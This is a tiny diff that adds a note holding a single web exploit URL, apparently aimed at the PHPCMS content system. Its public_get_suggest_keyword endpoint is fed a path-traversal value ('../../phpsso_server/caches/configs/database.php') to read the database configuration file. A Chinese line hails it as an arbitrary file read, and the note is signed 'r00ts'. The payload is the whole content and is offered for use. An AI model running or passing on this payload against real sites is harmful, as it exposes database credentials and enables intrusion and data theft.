@@ -1,0 +1,4 @@
+index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php
+
+任意读取啊，MJJ们。
+r00ts
